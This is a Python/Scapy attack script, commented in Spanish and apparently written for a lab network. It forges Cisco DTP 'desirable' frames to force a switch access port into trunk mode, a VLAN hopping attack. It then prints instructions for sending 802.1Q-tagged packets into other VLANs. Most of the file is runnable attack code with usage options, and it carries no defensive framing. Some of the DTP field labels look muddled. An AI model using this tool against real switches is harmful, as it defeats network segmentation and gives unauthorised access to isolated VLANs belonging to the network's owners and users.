#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DTP VLAN Hopping — Convertir puerto access en trunk
# Scapy 2.5.0 | Python 3.6.4 | Kali Linux 2018
# Red: 192.168.89.0/24
# USO: sudo python3 dtp_hopping.py -i eth0
#      sudo python3 dtp_hopping.py -i eth0 --count 5 --interval 1

import sys
import time
import argparse
import struct
from scapy.all import (
    Dot3, LLC, SNAP, sendp, get_if_hwaddr, conf
)

# ── DTP Frame Builder ──────────────────────────────────────────────────────────

def build_dtp_desirable(src_mac):
    """
    Construye un frame DTP con:
      - Trunk Status   = 0xA5  (Desirable/Trunk)
      - Trunk Type     = 0xA5  (ISL/802.1Q)
      - Neighbor       = MAC del atacante
    Los switches Cisco con DTP auto o desirable responderán
    negociando modo trunk.
    """
    # TLV helper
    def tlv(t, v):
        length = 4 + len(v)          # tipo(2) + largo(2) + valor
        return struct.pack("!HH", t, length) + v

    mac_bytes = bytes(int(x, 16) for x in src_mac.split(":"))

    dtp_payload = (
        struct.pack("!B", 0x01)              # DTP versión 1
        + tlv(0x0001, b"\xa5")               # Domain: Desirable
        + tlv(0x0002, b"\xa5")               # Status: Trunk
        + tlv(0x0003, b"\xa5")               # DTP type: 802.1Q/ISL
        + tlv(0x0004, mac_bytes)             # Neighbor MAC
    )

    dst_mac = "01:00:0c:cc:cc:cc"           # Cisco multicast
    pkt = (
        Dot3(src=src_mac, dst=dst_mac)
        / LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)
        / SNAP(OUI=0x00000C, code=0x2004)    # 0x2004 = DTP
        / dtp_payload
    )
    return pkt


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="DTP VLAN Hopping — fuerza negociación trunk en puerto access"
    )
    parser.add_argument("-i", "--iface",    default="eth0",
                        help="Interfaz de red conectada al switch (default: eth0)")
    parser.add_argument("-c", "--count",    type=int, default=10,
                        help="Cuántos frames DTP enviar (default: 10)")
    parser.add_argument("--interval",       type=float, default=0.5,
                        help="Segundos entre frames (default: 0.5)")
    args = parser.parse_args()

    conf.iface = args.iface
    src_mac    = get_if_hwaddr(args.iface)

    print(f"[*] Interfaz : {args.iface}  ({src_mac})")
    print(f"[*] Frames   : {args.count}  cada {args.interval}s")
    print(f"[*] Objetivo : Convertir Fa0/1 (access VLAN10) → trunk")
    print(f"[*] Destino  : 01:00:0c:cc:cc:cc (Cisco multicast)\n")

    pkt = build_dtp_desirable(src_mac)

    for i in range(1, args.count + 1):
        sendp(pkt, iface=args.iface, verbose=False)
        print(f"[{i:>3}/{args.count}] Frame DTP Desirable enviado")
        if i < args.count:
            time.sleep(args.interval)

    print("\n[+] Frames DTP enviados.")
    print("[+] Si el switch tiene DTP habilitado (default en Cisco),")
    print("    el puerto negociará modo TRUNK automáticamente.")
    print("\n[*] Verifica con:")
    print("    show interfaces Fa0/1 trunk   ← en el switch")
    print("    show interfaces Fa0/1 switchport\n")
    print("[*] Si el trunk está activo, agrega tags 802.1Q para")
    print("    saltar a otras VLANs desde tu frame:")
    print("    from scapy.all import Dot1Q, Ether, IP, ICMP, send")
    print("    pkt = Ether()/Dot1Q(vlan=20)/IP(dst='192.168.89.1')/ICMP()")
    print("    sendp(pkt, iface='eth0')")


if __name__ == "__main__":
    main()
